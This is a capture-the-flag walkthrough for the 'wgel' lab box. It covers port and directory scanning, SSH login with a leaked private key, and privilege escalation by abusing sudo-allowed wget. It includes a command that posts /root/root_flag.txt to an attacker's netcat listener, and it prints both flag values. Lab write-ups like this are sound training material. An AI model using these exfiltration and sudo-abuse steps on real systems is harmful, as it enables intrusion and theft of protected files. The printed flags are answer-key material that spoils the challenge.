
# 🛡️ CTF/Pentest Walkthrough: Exploiting wgel ctf(10.10.131.241)

## 🛰️ Target IP
`10.10.131.241`

---

## 🧭 Reconnaissance

### 🔍 Nmap Scan

```bash
nmap -A -sS -p- 10.10.131.241
```

**Open Ports:**
- `22/tcp` → OpenSSH 7.2p2 (Ubuntu)
- `80/tcp` → Apache/2.4.18

---

## 🌐 Web Enumeration

### 📂 Gobuster on `/`

```bash
gobuster dir -u http://10.10.131.241 -w /usr/share/wordlists/dirb/common.txt
```

**Interesting Results:**
- `/index.html` (Apache default page)
- `/sitemap/` (redirect)
- `/server-status` (403)

### 🔍 Gobuster on `/sitemap`

```bash
gobuster dir -u http://10.10.131.241/sitemap -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
- `/sitemap/.ssh/` → likely SSH keys

---

## 🔑 SSH Access

### 🔐 Discovered Private Key (id_rsa)

1. Created and saved key as `id_rsa`
2. Set proper permissions:

```bash
chmod 600 id_rsa
```

3. Connected via SSH:

```bash
ssh -i id_rsa jessie@10.10.131.241
```

---

## 🏴 User Flag

```bash
cd Documents/
cat user_flag.txt
```

📄 **Flag:** `057c67131c3d5e42dd5cd3075b198ff6`

---

## 🔐 Privilege Escalation

### 🔍 Sudo Permissions

```bash
sudo -l
```

**Allowed:**  
`(root) NOPASSWD: /usr/bin/wget`

---

## 🚀 Exploit with `wget --post-file`

### 🧪 Transfer root flag to attacker via HTTP POST

**Attacker (Kali):**

```bash
nc -lvnp 80
```

**Victim (CorpOne):**

```bash
sudo wget --post-file=/root/root_flag.txt http://10.17.7.111
```

### ✅ Result (Captured on Attacker Netcat):

```
POST / HTTP/1.1
...
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```

📄 **Root Flag:** `b1b968b37519ad1daa6408188649263d`

---

## ✅ Summary

| Stage        | Result                            |
|--------------|-----------------------------------|
| User flag    | ✅ `057c67131c3d5e42dd5cd3075b198ff6` |
| Root flag    | ✅ `b1b968b37519ad1daa6408188649263d` |
| Exploit Used | `wget --post-file` with `sudo`    |
| Privilege Escalation | Via allowed `wget` binary  |

---

📝 **Tips for Next Time**
- Always test `wget`-based `sudo` exploits with netcat and valid HTTP response.
- Use Python HTTP server to cleanly receive and store file data if needed.
